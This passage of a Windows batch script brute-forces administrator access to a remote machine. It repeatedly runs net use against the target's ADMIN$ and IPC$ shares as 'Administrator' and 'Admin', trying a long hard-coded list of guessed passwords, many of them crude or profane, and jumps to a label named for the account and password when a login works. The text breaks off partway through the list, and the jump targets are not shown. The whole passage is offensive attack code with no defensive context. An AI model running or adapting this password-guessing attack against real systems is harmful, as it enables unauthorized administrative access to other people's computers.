   @echo off

   net use \\%1\ADMIN$ "" /user:Administrator
   if not errorlevel 1 goto Administrator
   net use \\%1\IPC$ "" /user:Administrator
   if not errorlevel 1 goto Administrator
   net use \\%1\ADMIN$ "pass123" /user:Administrator
   if not errorlevel 1 goto Administratorpass123
   net use \\%1\IPC$ "pass123" /user:Administrator
   if not errorlevel 1 goto Administratorpass123
   net use \\%1\ADMIN$ "something" /user:Administrator
   if not errorlevel 1 goto administratorsomething
   net use \\%1\IPC$ "something" /user:Administrator
   if not errorlevel 1 goto administratorsomething
   net use \\%1\ADMIN$ "mypass" /user:Administrator
   if not errorlevel 1 goto Administratormypass
   net use \\%1\IPC$ "mypass" /user:Administrator
   if not errorlevel 1 goto Administratormypass
   net use \\%1\ADMIN$ "login" /user:Administrator
   if not errorlevel 1 goto Administratorlogin
   net use \\%1\IPC$ "login" /user:Administrator
   if not errorlevel 1 goto Administratorlogin
   net use \\%1\ADMIN$ "access" /user:Administrator
   if not errorlevel 1 goto Administratoraccess
   net use \\%1\IPC$ "access" /user:Administrator
   if not errorlevel 1 goto Administratoraccess
   net use \\%1\ADMIN$ "password" /user:Administrator
   if not errorlevel 1 goto Administratorpassword
   net use \\%1\IPC$ "password" /user:Administrator
   if not errorlevel 1 goto Administratorpassword
   net use \\%1\ADMIN$ "matrix" /user:Administrator
   if not errorlevel 1 goto Administratormatrix
   net use \\%1\IPC$ "matrix" /user:Administrator
   if not errorlevel 1 goto Administratormatrix
   net use \\%1\ADMIN$ "security" /user:Administrator
   if not errorlevel 1 goto Administratorsecurity
   net use \\%1\IPC$ "security" /user:Administrator
   if not errorlevel 1 goto Administratorsecurity
   net use \\%1\ADMIN$ "success" /user:Administrator
   if not errorlevel 1 goto Administratorsuccess
   net use \\%1\IPC$ "success" /user:Administrator
   if not errorlevel 1 goto Administratorsuccess
   net use \\%1\ADMIN$ "special" /user:Administrator
   if not errorlevel 1 goto Administratorspecial
   net use \\%1\IPC$ "special" /user:Administrator
   if not errorlevel 1 goto Administratorspecial
   net use \\%1\ADMIN$ "ultra" /user:Administrator
   if not errorlevel 1 goto Administratorultra
   net use \\%1\IPC$ "ultra" /user:Administrator
   if not errorlevel 1 goto Administratorultra
   net use \\%1\ADMIN$ "pass" /user:Administrator
   if not errorlevel 1 goto Administratorpass
   net use \\%1\IPC$ "pass" /user:Administrator
   if not errorlevel 1 goto Administratorpass
   net use \\%1\ADMIN$ "enable" /user:Administrator
   if not errorlevel 1 goto Administratorenable
   net use \\%1\IPC$ "enable" /user:Administrator
   if not errorlevel 1 goto Administratorenable
   net use \\%1\ADMIN$ "passwd" /user:Administrator
   if not errorlevel 1 goto Administratorpasswd
   net use \\%1\IPC$ "passwd" /user:Administrator
   if not errorlevel 1 goto Administratorpasswd
   net use \\%1\ADMIN$ "password" /user:Administrator
   if not errorlevel 1 goto Administratorpassword
   net use \\%1\IPC$ "password" /user:Administrator
   if not errorlevel 1 goto Administratorpassword
   net use \\%1\ADMIN$ "internet" /user:Administrator
   if not errorlevel 1 goto Administratorinternet
   net use \\%1\IPC$ "internet" /user:Administrator
   if not errorlevel 1 goto Administratorinternet
   net use \\%1\ADMIN$ "network" /user:Administrator
   if not errorlevel 1 goto Administratornetwork
   net use \\%1\IPC$ "network" /user:Administrator
   if not errorlevel 1 goto Administratornetwork
   net use \\%1\ADMIN$ "edu" /user:Administrator
   if not errorlevel 1 goto Administratoredu
   net use \\%1\IPC$ "edu" /user:Administrator
   if not errorlevel 1 goto Administratoredu
   net use \\%1\ADMIN$ "owner" /user:Administrator
   if not errorlevel 1 goto Administratorowner
   net use \\%1\IPC$ "owner" /user:Administrator
   if not errorlevel 1 goto Administratorowner
   net use \\%1\ADMIN$ "local" /user:Administrator
   if not errorlevel 1 goto Administratorlocal
   net use \\%1\IPC$ "local" /user:Administrator
   if not errorlevel 1 goto Administratorlocal
   net use \\%1\ADMIN$ "remote" /user:Administrator
   if not errorlevel 1 goto Administratorremote
   net use \\%1\IPC$ "remote" /user:Administrator
   if not errorlevel 1 goto Administratorremote
   net use \\%1\ADMIN$ "lan" /user:Administrator
   if not errorlevel 1 goto Administratorlan
   net use \\%1\IPC$ "lan" /user:Administrator
   if not errorlevel 1 goto Administratorlan
   net use \\%1\ADMIN$ "root" /user:Administrator
   if not errorlevel 1 goto Administratorroot
   net use \\%1\IPC$ "root" /user:Administrator
   if not errorlevel 1 goto Administratorroot
   net use \\%1\ADMIN$ "bitch" /user:Administrator
   if not errorlevel 1 goto Administratorbitch
   net use \\%1\IPC$ "bitch" /user:Administrator
   if not errorlevel 1 goto Administratorbitch
   net use \\%1\ADMIN$ "fault" /user:Administrator
   if not errorlevel 1 goto Administratorfault
   net use \\%1\IPC$ "fault" /user:Administrator
   if not errorlevel 1 goto Administratorfault
   net use \\%1\ADMIN$ "cat" /user:Administrator
   if not errorlevel 1 goto Administratorcat
   net use \\%1\IPC$ "cat" /user:Administrator
   if not errorlevel 1 goto Administratorcat
   net use \\%1\ADMIN$ "911" /user:Administrator
   if not errorlevel 1 goto Administrator911
   net use \\%1\IPC$ "911" /user:Administrator
   if not errorlevel 1 goto Administrator911
   net use \\%1\ADMIN$ "towers" /user:Administrator
   if not errorlevel 1 goto Administratortowers
   net use \\%1\IPC$ "towers" /user:Administrator
   if not errorlevel 1 goto Administratortowers
   net use \\%1\ADMIN$ "123" /user:Administrator
   if not errorlevel 1 goto Administrator123
   net use \\%1\IPC$ "123" /user:Administrator
   if not errorlevel 1 goto Administrator123
   net use \\%1\ADMIN$ "1234" /user:Administrator
   if not errorlevel 1 goto Administrator1234
   net use \\%1\IPC$ "1234" /user:Administrator
   if not errorlevel 1 goto Administrator1234
   net use \\%1\ADMIN$ "12345" /user:Administrator
   if not errorlevel 1 goto Administrator12345
   net use \\%1\IPC$ "12345" /user:Administrator
   if not errorlevel 1 goto Administrator12345
   net use \\%1\ADMIN$ "123456" /user:Administrator
   if not errorlevel 1 goto Administrator123456
   net use \\%1\IPC$ "123456" /user:Administrator
   if not errorlevel 1 goto Administrator123456
   net use \\%1\ADMIN$ "654321" /user:Administrator
   if not errorlevel 1 goto Administrator654321
   net use \\%1\IPC$ "654321" /user:Administrator
   if not errorlevel 1 goto Administrator654321
   net use \\%1\ADMIN$ "54321" /user:Administrator
   if not errorlevel 1 goto Administrator54321
   net use \\%1\IPC$ "54321" /user:Administrator
   if not errorlevel 1 goto Administrator54321
   net use \\%1\ADMIN$ "4321" /user:Administrator
   if not errorlevel 1 goto Administrator4321
   net use \\%1\IPC$ "4321" /user:Administrator
   if not errorlevel 1 goto Administrator4321
   net use \\%1\ADMIN$ "321" /user:Administrator
   if not errorlevel 1 goto Administrator321
   net use \\%1\IPC$ "321" /user:Administrator
   if not errorlevel 1 goto Administrator321
   net use \\%1\ADMIN$ "student" /user:Administrator
   if not errorlevel 1 goto Administratorstudent
   net use \\%1\IPC$ "student" /user:Administrator
   if not errorlevel 1 goto Administratorstudent
   net use \\%1\ADMIN$ "user" /user:Administrator
   if not errorlevel 1 goto Administratoruser
   net use \\%1\IPC$ "user" /user:Administrator
   if not errorlevel 1 goto Administratoruser
   net use \\%1\ADMIN$ "bootie" /user:Administrator
   if not errorlevel 1 goto Administratorbootie
   net use \\%1\IPC$ "bootie" /user:Administrator
   if not errorlevel 1 goto Administratorbootie
   net use \\%1\ADMIN$ "poop" /user:Administrator
   if not errorlevel 1 goto Administratorpoop
   net use \\%1\IPC$ "poop" /user:Administrator
   if not errorlevel 1 goto Administratorpoop
   net use \\%1\ADMIN$ "poopie" /user:Administrator
   if not errorlevel 1 goto Administratorpoopie
   net use \\%1\IPC$ "poopie" /user:Administrator
   if not errorlevel 1 goto Administratorpoopie
   net use \\%1\ADMIN$ "weed" /user:Administrator
   if not errorlevel 1 goto Administratorweed
   net use \\%1\IPC$ "weed" /user:Administrator
   if not errorlevel 1 goto Administratorweed
   net use \\%1\ADMIN$ "water" /user:Administrator
   if not errorlevel 1 goto Administratorwater
   net use \\%1\IPC$ "water" /user:Administrator
   if not errorlevel 1 goto Administratorwater
   net use \\%1\ADMIN$ "cool" /user:Administrator
   if not errorlevel 1 goto Administratorcool
   net use \\%1\IPC$ "cool" /user:Administrator
   if not errorlevel 1 goto Administratorcool
   net use \\%1\ADMIN$ "joint" /user:Administrator
   if not errorlevel 1 goto Administratorjoint
   net use \\%1\IPC$ "joint" /user:Administrator
   if not errorlevel 1 goto Administratorjoint
   net use \\%1\ADMIN$ "crack" /user:Administrator
   if not errorlevel 1 goto Administratorcrack
   net use \\%1\IPC$ "crack" /user:Administrator
   if not errorlevel 1 goto Administratorcrack
   net use \\%1\ADMIN$ "danger" /user:Administrator
   if not errorlevel 1 goto Administratordanger
   net use \\%1\IPC$ "danger" /user:Administrator
   if not errorlevel 1 goto Administratordanger
   net use \\%1\ADMIN$ "weiner" /user:Administrator
   if not errorlevel 1 goto Administratorweiner
   net use \\%1\IPC$ "weiner" /user:Administrator
   if not errorlevel 1 goto Administratorweiner
   net use \\%1\ADMIN$ "electrical" /user:Administrator
   if not errorlevel 1 goto Administratorelectrical
   net use \\%1\IPC$ "electrical" /user:Administrator
   if not errorlevel 1 goto Administratorelectrical
   net use \\%1\ADMIN$ "electric" /user:Administrator
   if not errorlevel 1 goto Administratorelectric
   net use \\%1\IPC$ "electric" /user:Administrator
   if not errorlevel 1 goto Administratorelectric
   net use \\%1\ADMIN$ "electricity" /user:Administrator
   if not errorlevel 1 goto Administratorelectricity
   net use \\%1\IPC$ "electricity" /user:Administrator
   if not errorlevel 1 goto Administratorelectricity
   net use \\%1\ADMIN$ "penis" /user:Administrator
   if not errorlevel 1 goto Administratorpenis
   net use \\%1\IPC$ "penis" /user:Administrator
   if not errorlevel 1 goto Administratorpenis
   net use \\%1\ADMIN$ "cent" /user:Administrator
   if not errorlevel 1 goto Administratorcent
   net use \\%1\IPC$ "cent" /user:Administrator
   if not errorlevel 1 goto Administratorcent
   net use \\%1\ADMIN$ "50cent" /user:Administrator
   if not errorlevel 1 goto Administrator50cent
   net use \\%1\IPC$ "50cent" /user:Administrator
   if not errorlevel 1 goto Administrator50cent
   net use \\%1\ADMIN$ "eminem" /user:Administrator
   if not errorlevel 1 goto Administratoreminem
   net use \\%1\IPC$ "eminem" /user:Administrator
   if not errorlevel 1 goto Administratoreminem
   net use \\%1\ADMIN$ "vagina" /user:Administrator
   if not errorlevel 1 goto Administratorvagina
   net use \\%1\IPC$ "vagina" /user:Administrator
   if not errorlevel 1 goto Administratorvagina
   net use \\%1\ADMIN$ "cunt" /user:Administrator
   if not errorlevel 1 goto Administratorcunt
   net use \\%1\IPC$ "cunt" /user:Administrator
   if not errorlevel 1 goto Administratorcunt
   net use \\%1\ADMIN$ "pussy" /user:Administrator
   if not errorlevel 1 goto Administratorpussy
   net use \\%1\IPC$ "pussy" /user:Administrator
   if not errorlevel 1 goto Administratorpussy
   net use \\%1\ADMIN$ "cock" /user:Administrator
   if not errorlevel 1 goto Administratorcock
   net use \\%1\IPC$ "cock" /user:Administrator
   if not errorlevel 1 goto Administratorcock
   net use \\%1\ADMIN$ "dick" /user:Administrator
   if not errorlevel 1 goto Administratordick
   net use \\%1\IPC$ "dick" /user:Administrator
   if not errorlevel 1 goto Administratordick
   net use \\%1\ADMIN$ "shithead" /user:Administrator
   if not errorlevel 1 goto Administratorshithead
   net use \\%1\IPC$ "shithead" /user:Administrator
   if not errorlevel 1 goto Administratorshithead
   net use \\%1\ADMIN$ "blunt" /user:Administrator
   if not errorlevel 1 goto Administratorblunt
   net use \\%1\IPC$ "blunt" /user:Administrator
   if not errorlevel 1 goto Administratorblunt
   net use \\%1\ADMIN$ "shotgun" /user:Administrator
   if not errorlevel 1 goto Administratorshotgun
   net use \\%1\IPC$ "shotgun" /user:Administrator
   if not errorlevel 1 goto Administratorshotgun
   net use \\%1\ADMIN$ "glock" /user:Administrator
   if not errorlevel 1 goto Administratorglock
   net use \\%1\IPC$ "glock" /user:Administrator
   if not errorlevel 1 goto Administratorglock
   net use \\%1\ADMIN$ "executable" /user:Administrator
   if not errorlevel 1 goto Administratorexecutable
   net use \\%1\IPC$ "executable" /user:Administrator
   if not errorlevel 1 goto Administratorexecutable
   net use \\%1\ADMIN$ "bong" /user:Administrator
   if not errorlevel 1 goto Administratorbong
   net use \\%1\IPC$ "bong" /user:Administrator
   if not errorlevel 1 goto Administratorbong
   net use \\%1\ADMIN$ "dildo" /user:Administrator
   if not errorlevel 1 goto Administratordildo
   net use \\%1\IPC$ "dildo" /user:Administrator
   if not errorlevel 1 goto Administratordildo
   net use \\%1\ADMIN$ "baseball" /user:Administrator
   if not errorlevel 1 goto Administratorbaseball
   net use \\%1\IPC$ "baseball" /user:Administrator
   if not errorlevel 1 goto Administratorbaseball
   net use \\%1\ADMIN$ "basketball" /user:Administrator
   if not errorlevel 1 goto Administratorbasketball
   net use \\%1\IPC$ "basketball" /user:Administrator
   if not errorlevel 1 goto Administratorbasketball
   net use \\%1\ADMIN$ "football" /user:Administrator
   if not errorlevel 1 goto Administratorfootball
   net use \\%1\IPC$ "football" /user:Administrator
   if not errorlevel 1 goto Administratorfootball
   net use \\%1\ADMIN$ "soccer" /user:Administrator
   if not errorlevel 1 goto Administratorsoccer
   net use \\%1\IPC$ "soccer" /user:Administrator
   if not errorlevel 1 goto Administratorsoccer
   net use \\%1\ADMIN$ "pot" /user:Administrator
   if not errorlevel 1 goto Administratorpot
   net use \\%1\IPC$ "pot" /user:Administrator
   if not errorlevel 1 goto Administratorpot
   net use \\%1\ADMIN$ "dope" /user:Administrator
   if not errorlevel 1 goto Administratordope
   net use \\%1\IPC$ "dope" /user:Administrator
   if not errorlevel 1 goto Administratordope
   net use \\%1\ADMIN$ "maryjane" /user:Administrator
   if not errorlevel 1 goto Administratormaryjane
   net use \\%1\IPC$ "maryjane" /user:Administrator
   if not errorlevel 1 goto Administratormaryjane
   net use \\%1\ADMIN$ "marijuana" /user:Administrator
   if not errorlevel 1 goto Administratormarijuana
   net use \\%1\IPC$ "marijuana" /user:Administrator
   if not errorlevel 1 goto Administratormarijuana
   net use \\%1\ADMIN$ "money" /user:Administrator
   if not errorlevel 1 goto Administratormoney
   net use \\%1\IPC$ "money" /user:Administrator
   if not errorlevel 1 goto Administratormoney
   net use \\%1\ADMIN$ "girl" /user:Administrator
   if not errorlevel 1 goto Administratorgirl
   net use \\%1\IPC$ "girl" /user:Administrator
   if not errorlevel 1 goto Administratorgirl
   net use \\%1\ADMIN$ "girls" /user:Administrator
   if not errorlevel 1 goto Administratorgirls
   net use \\%1\IPC$ "girls" /user:Administrator
   if not errorlevel 1 goto Administratorgirls
   net use \\%1\ADMIN$ "woman" /user:Administrator
   if not errorlevel 1 goto Administratorwoman
   net use \\%1\IPC$ "woman" /user:Administrator
   if not errorlevel 1 goto Administratorwoman
   net use \\%1\ADMIN$ "women" /user:Administrator
   if not errorlevel 1 goto Administratorwomen
   net use \\%1\IPC$ "women" /user:Administrator
   if not errorlevel 1 goto Administratorwomen
   net use \\%1\ADMIN$ "female" /user:Administrator
   if not errorlevel 1 goto Administratorfemale
   net use \\%1\IPC$ "female" /user:Administrator
   if not errorlevel 1 goto Administratorfemale
   net use \\%1\ADMIN$ "america" /user:Administrator
   if not errorlevel 1 goto Administratoramerica
   net use \\%1\IPC$ "america" /user:Administrator
   if not errorlevel 1 goto Administratoramerica
   net use \\%1\ADMIN$ "usa" /user:Administrator
   if not errorlevel 1 goto Administratorusa
   net use \\%1\IPC$ "usa" /user:Administrator
   if not errorlevel 1 goto Administratorusa
   net use \\%1\ADMIN$ "god" /user:Administrator
   if not errorlevel 1 goto Administratorgod
   net use \\%1\IPC$ "god" /user:Administrator
   if not errorlevel 1 goto Administratorgod
   net use \\%1\ADMIN$ "jesus" /user:Administrator
   if not errorlevel 1 goto Administratorjesus
   net use \\%1\IPC$ "jesus" /user:Administrator
   if not errorlevel 1 goto Administratorjesus
   net use \\%1\ADMIN$ "technology" /user:Administrator
   if not errorlevel 1 goto Administratortechnology
   net use \\%1\IPC$ "technology" /user:Administrator
   if not errorlevel 1 goto Administratortechnology
   net use \\%1\ADMIN$ "computer" /user:Administrator
   if not errorlevel 1 goto Administratorcomputer
   net use \\%1\IPC$ "computer" /user:Administrator
   if not errorlevel 1 goto Administratorcomputer
   net use \\%1\ADMIN$ "porn" /user:Administrator
   if not errorlevel 1 goto Administratorporn
   net use \\%1\IPC$ "porn" /user:Administrator
   if not errorlevel 1 goto Administratorporn
   net use \\%1\ADMIN$ "clock" /user:Administrator
   if not errorlevel 1 goto Administratorclock
   net use \\%1\IPC$ "clock" /user:Administrator
   if not errorlevel 1 goto Administratorclock
   net use \\%1\ADMIN$ "church" /user:Administrator
   if not errorlevel 1 goto Administratorchurch
   net use \\%1\IPC$ "church" /user:Administrator
   if not errorlevel 1 goto Administratorchurch
   net use \\%1\ADMIN$ "church" /user:Administrator
   if not errorlevel 1 goto Administratorchurch
   net use \\%1\IPC$ "church" /user:Administrator
   if not errorlevel 1 goto Administratorchurch
   net use \\%1\ADMIN$ "temp" /user:Administrator
   if not errorlevel 1 goto Administratortemp
   net use \\%1\IPC$ "temp" /user:Administrator
   if not errorlevel 1 goto Administratortemp
   net use \\%1\ADMIN$ "" /user:Admin
   if not errorlevel 1 goto Admin
   net use \\%1\IPC$ "" /user:Admin
   if not errorlevel 1 goto Admin
   net use \\%1\ADMIN$ "pass123" /user:Admin
   if not errorlevel 1 goto Adminpass123
   net use \\%1\IPC$ "pass123" /user:Admin
   if not errorlevel 1 goto Adminpass123
   net use \\%1\ADMIN$ "something" /user:Admin
   if not errorlevel 1 goto Adminsomething
   net use \\%1\IPC$ "something" /user:Admin
   if not errorlevel 1 goto Adminsomething
   net use \\%1\ADMIN$ "mypass" /user:Admin
   if not errorlevel 1 goto Adminmypass
   net use \\%1\IPC$ "mypass" /user:Admin
   if not errorlevel 1 goto Adminmypass
   net use \\%1\ADMIN$ "login" /user:Admin
   if not errorlevel 1 goto Adminlogin
   net use \\%1\IPC$ "login" /user:Admin
   if not errorlevel 1 goto Adminlogin
   net use \\%1\ADMIN$ "access" /user:Admin
   if not errorlevel 1 goto Adminaccess
   net use \\%1\IPC$ "access" /user:Admin
   if not errorlevel 1 goto Adminaccess
   net use \\%1\ADMIN$ "password" /user:Admin
   if not errorlevel 1 goto Adminpassword
   net use \\%1\IPC$ "password" /user:Admin
   if not errorlevel 1 goto Adminpassword
   net use \\%1\ADMIN$ "matrix" /user:Admin
   if not errorlevel 1 goto Adminmatrix
   net use \\%1\IPC$ "matrix" /user:Admin
   if not errorlevel 1 goto Adminmatrix
   net use \\%1\ADMIN$ "security" /user:Admin
   if not errorlevel 1 goto Adminsecurity
   net use \\%1\IPC$ "security" /user:Admin
   if not errorlevel 1 goto Adminsecurity
   net use \\%1\ADMIN$ "success" /user:Admin
   if not errorlevel 1 goto Adminsuccess
   net use \\%1\IPC$ "success" /user:Admin
   if not errorlevel 1 goto Adminsuccess
   net use \\%1\ADMIN$ "special" /user:Admin
   if not errorlevel 1 goto Adminspecial
   net use \\%1\IPC$ "special" /user:Admin
   if not errorlevel 1 goto Adminspecial
   net use \\%1\ADMIN$ "ultra" /user:Admin
   if not errorlevel 1 goto Adminultra
   net use \\%1\IPC$ "ultra" /user:Admin
   if not errorlevel 1 goto Adminultra
   net use \\%1\ADMIN$ "pass" /user:Admin
   if not errorlevel 1 goto Adminpass
   net use \\%1\IPC$ "pass" /user:Admin
   if not errorlevel 1 goto Adminpass
   net use \\%1\ADMIN$ "enable" /user:Admin
   if not errorlevel 1 goto Adminenable
   net use \\%1\IPC$ "enable" /user:Admin
   if not errorlevel 1 goto Adminenable
   net use \\%1\ADMIN$ "passwd" /user:Admin
   if not errorlevel 1 goto Adminpasswd
   net use \\%1\IPC$ "passwd" /user:Admin
   if not errorlevel 1 goto Adminpasswd
   net use \\%1\ADMIN$ "password" /user:Admin
   if not errorlevel 1 goto Adminpassword
   net use \\%1\IPC$ "password" /user:Admin
   if not errorlevel 1 goto Adminpassword
   net use \\%1\ADMIN$ "internet" /user:Admin
   if not errorlevel 1 goto Admininternet
   net use \\%1\IPC$ "internet" /user:Admin
   if not errorlevel 1 goto Admininternet
   net use \\%1\ADMIN$ "network" /user:Admin
   if not errorlevel 1 goto Adminnetwork
   net use \\%1\IPC$ "network" /user:Admin
   if not errorlevel 1 goto Adminnetwork
   net use \\%1\ADMIN$ "edu" /user:Admin
   if not errorlevel 1 goto Adminedu
   net use \\%1\IPC$ "edu" /user:Admin
   if not errorlevel 1 goto Adminedu
   net use \\%1\ADMIN$ "owner" /user:Admin
   if not errorlevel 1 goto Adminowner
   net use \\%1\IPC$ "owner" /user:Admin
   if not errorlevel 1 goto Adminowner
   net use \\%1\ADMIN$ "local" /user:Admin
   if not errorlevel 1 goto Adminlocal
   net use \\%1\IPC$ "local" /user:Admin
   if not errorlevel 1 goto Adminlocal
   net use \\%1\ADMIN$ "remote" /user:Admin
   if not errorlevel 1 goto Adminremote
   net use \\%1\IPC$ "remote" /user:Admin
   if not errorlevel 1 goto Adminremote
   net use \\%1\ADMIN$ "lan" /user:Admin
   if not errorlevel 1 goto Adminlan
   net use \\%1\IPC$ "lan" /user:Admin
   if not errorlevel 1 goto Adminlan
   net use \\%1\ADMIN$ "root" /user:Admin
   if not errorlevel 1 goto Adminroot
   net use \\%1\IPC$ "root" /user:Admin
   if not errorlevel 1 goto Adminroot
   net use \\%1\ADMIN$ "bitch" /user:Admin
   if not errorlevel 1 goto Adminbitch
   net use \\%1\IPC$ "bitch" /user:Admin
   if not errorlevel 1 goto Adminbitch
   net use \\%1\ADMIN$ "fault" /user:Admin
   if not errorlevel 1 goto Adminfault
   net use \\%1\IPC$ "fault" /user:Admin
   if not errorlevel 1 goto Adminfault
   net use \\%1\ADMIN$ "cat" /user:Admin
   if not errorlevel 1 goto Admincat
   net use \\%1\IPC$ "cat" /user:Admin
   if not errorlevel 1 goto Admincat
   net use \\%1\ADMIN$ "911" /user:Admin
   if not errorlevel 1 goto Admin911
   net use \\%1\IPC$ "911" /user:Admin
   if not errorlevel 1 goto Admin911
   net use \\%1\ADMIN$ "towers" /user:Admin
   if not errorlevel 1 goto Admintowers
   net use \\%1\IPC$ "towers" /user:Admin
   if not errorlevel 1 goto Admintowers
   net use \\%1\ADMIN$ "123" /user:Admin
   if not errorlevel 1 goto Admin123
   net use \\%1\IPC$ "123" /user:Admin
   if not errorlevel 1 goto Admin123
   net use \\%1\ADMIN$ "1234" /user:Admin
   if not errorlevel 1 goto Admin1234
   net use \\%1\IPC$ "1234" /user:Admin
   if not errorlevel 1 goto Admin1234
   net use \\%1\ADMIN$ "12345" /user:Admin
   if not errorlevel 1 goto Admin12345
   net use \\%1\IPC$ "12345" /user:Admin
   if not errorlevel 1 goto Admin12345
   net use \\%1\ADMIN$ "123456" /user:Admin
   if not errorlevel 1 goto Admin123456
   net use \\%1\IPC$ "123456" /user:Admin
   if not errorlevel 1 goto Admin123456
   net use \\%1\ADMIN$ "654321" /user:Admin
   if not errorlevel 1 goto Admin654321
   net use \\%1\IPC$ "654321" /user:Admin
   if not errorlevel 1 goto Admin654321
   net use \\%1\ADMIN$ "54321" /user:Admin
   if not errorlevel 1 goto Admin54321
   net use \\%1\IPC$ "54321" /user:Admin
   if not errorlevel 1 goto Admin54321
   net use \\%1\ADMIN$ "4321" /user:Admin
   if not errorlevel 1 goto Admin4321
   net use \\%1\IPC$ "4321" /user:Admin
   if not errorlevel 1 goto Admin4321
   net use \\%1\ADMIN$ "321" /user:Admin
   if not errorlevel 1 goto Admin321
   net use \\%1\IPC$ "321" /user:Admin
   if not errorlevel 1 goto Admin321
   net use \\%1\ADMIN$ "student" /user:Admin
   if not errorlevel 1 goto Adminstudent
   net use \\%1\IPC$ "student" /user:Admin
   if not errorlevel 1 goto Adminstudent
   net use \\%1\ADMIN$ "user" /user:Admin
   if not errorlevel 1 goto Adminuser
   net use \\%1\IPC$ "user" /user:Admin
   if not errorlevel 1 goto Adminuser
   net use \\%1\ADMIN$ "bootie" /user:Admin
   if not errorlevel 1 goto Adminbootie
   net use \\%1\IPC$ "bootie" /user:Admin
   if not errorlevel 1 goto Adminbootie
   net use \\%1\ADMIN$ "poop" /user:Admin
   if not errorlevel 1 goto Adminpoop
   net use \\%1\IPC$ "poop" /user:Admin
   if not errorlevel 1 goto Adminpoop
   net use \\%1\ADMIN$ "poopie" /user:Admin
   if not errorlevel 1 goto Adminpoopie
   net use \\%1\IPC$ "poopie" /user:Admin
   if not errorlevel 1 goto Adminpoopie
   net use \\%1\ADMIN$ "weed" /user:Admin
   if not errorlevel 1 goto Adminweed
   net use \\%1\IPC$ "weed" /user:Admin
   if not errorlevel 1 goto Adminweed
   net use \\%1\ADMIN$ "water" /user:Admin
   if not errorlevel 1 goto Adminwater
   net use \\%1\IPC$ "water" /user:Admin
   if not errorlevel 1 goto Adminwater
   net use \\%1\ADMIN$ "cool" /user:Admin
   if not errorlevel 1 goto Admincool
   net use \\%1\IPC$ "cool" /user:Admin
   if not errorlevel 1 goto Admincool
   net use \\%1\ADMIN$ "joint" /user:Admin
   if not errorlevel 1 goto Adminjoint
   net use \\%1\IPC$ "joint" /user:Admin
   if not errorlevel 1 goto Adminjoint
   net use \\%1\ADMIN$ "crack" /user:Admin
   if not errorlevel 1 goto Admincrack
   net use \\%1\IPC$ "crack" /user:Admin
   if not errorlevel 1 goto Admincrack
   net use \\%1\ADMIN$ "danger" /user:Admin
   if not errorlevel 1 goto Admindanger
   net use \\%1\IPC$ "danger" /user:Admin
   if not errorlevel 1 goto Admindanger
   net use \\%1\ADMIN$ "weiner" /user:Admin
   if not errorlevel 1 goto Adminweiner
   net use \\%1\IPC$ "weiner" /user:Admin
   if not errorlevel 1 goto Adminweiner
   net use \\%1\ADMIN$ "electrical" /user:Admin
   if not errorlevel 1 goto Adminelectrical
   net use \\%1\IPC$ "electrical" /user:Admin
   if not errorlevel 1 goto Adminelectrical
   net use \\%1\ADMIN$ "electric" /user:Admin
   if not errorlevel 1 goto Adminelectric
   net use \\%1\IPC$ "electric" /user:Admin
   if not errorlevel 1 goto Adminelectric
   net use \\%1\ADMIN$ "electricity" /user:Admin
   if not errorlevel 1 goto Adminelectricity
   net use \\%1\IPC$ "electricity" /user:Admin
   if not errorlevel 1 goto Adminelectricity
   net use \\%1\ADMIN$ "penis" /user:Admin
   if not errorlevel 1 goto Adminpenis
   net use \\%1\IPC$ "penis" /user:Admin
   if not errorlevel 1 goto Adminpenis
   net use \\%1\ADMIN$ "cent" /user:Admin
   if not errorlevel 1 goto Admincent
   net use \\%1\IPC$ "cent" /user:Admin
   if not errorlevel 1 goto Admincent
   net use \\%1\ADMIN$ "50cent" /user:Admin
   if not errorlevel 1 goto Admin50cent
   net use \\%1\IPC$ "50cent" /user:Admin
   if not errorlevel 1 goto Admin50cent
   net use \\%1\ADMIN$ "eminem" /user:Admin
   if not errorlevel 1 goto Admineminem
   net use \\%1\IPC$ "eminem" /user:Admin
   if not errorlevel 1 goto Admineminem
   net use \\%1\ADMIN$ "vagina" /user:Admin
   if not errorlevel 1 goto Adminvagina
   net use \\%1\IPC$ "vagina" /user:Admin
   if not errorlevel 1 goto Adminvagina
   net use \\%1\ADMIN$ "cunt" /user:Admin
   if not errorlevel 1 goto Admincunt
   net use \\%1\IPC$ "cunt" /user:Admin
   if not errorlevel 1 goto Admincunt
   net use \\%1\ADMIN$ "pussy" /user:Admin
   if not errorlevel 1 goto Adminpussy
   net use \\%1\IPC$ "pussy" /user:Admin
   if not errorlevel 1 goto Adminpussy
   net use \\%1\ADMIN$ "cock" /user:Admin
   if not errorlevel 1 goto Admincock
   net use \\%1\IPC$ "cock" /user:Admin
   if not errorlevel 1 goto Admincock
   net use \\%1\ADMIN$ "dick" /user:Admin
   if not errorlevel 1 goto Admindick
   net use \\%1\IPC$ "dick" /user:Admin
   if not errorlevel 1 goto Admindick
   net use \\%1\ADMIN$ "shithead" /user:Admin
   if not errorlevel 1 goto Adminshithead
   net use \\%1\IPC$ "shithead" /user:Admin
   if not errorlevel 1 goto Adminshithead
   net use \\%1\ADMIN$ "blunt" /user:Admin
   if not errorlevel 1 goto Adminblunt
   net use \\%1\IPC$ "blunt" /user:Admin
   if not errorlevel 1 goto Adminblunt
   net use \\%1\ADMIN$ "shotgun" /user:Admin
   if not errorlevel 1 goto Adminshotgun
   net use \\%1\IPC$ "shotgun" /user:Admin
   if not errorlevel 1 goto Adminshotgun
   net use \\%1\ADMIN$ "glock" /user:Admin
   if not errorlevel 1 goto Adminglock
   net use \\%1\IPC$ "glock" /user:Admin
   if not errorlevel 1 goto Adminglock
   net use \\%1\ADMIN$ "executable" /user:Admin
   if not errorlevel 1 goto Adminexecutable
   net use \\%1\IPC$ "executable" /user:Admin
   if not errorlevel 1 goto Adminexecutable
   net use \\%1\ADMIN$ "bong" /user:Admin
   if not errorlevel 1 goto Adminbong
   net use \\%1\IPC$ "bong" /user:Admin
   if not errorlevel 1 goto Adminbong
   net use \\%1\ADMIN$ "dildo" /user:Admin
   if not errorlevel 1 goto Admindildo
   net use \\%1\IPC$ "dildo" /user:Admin
   if not errorlevel 1 goto Admindildo
   net use \\%1\ADMIN$ "baseball" /user:Admin
   if not errorlevel 1 goto Adminbaseball
   net use \\%1\IPC$ "baseball" /user:Admin
   if not errorlevel 1 goto Adminbaseball
   net use \\%1\ADMIN$ "basketball" /user:Admin
   if not errorlevel 1 goto Adminbasketball
   net use \\%1\IPC$ "basketball" /user:Admin
   if not errorlevel 1 goto Adminbasketball
   net use \\%1\ADMIN$ "football" /user:Admin
   if not errorlevel 1 goto Adminfootball
   net use \\%1\IPC$ "football" /user:Admin
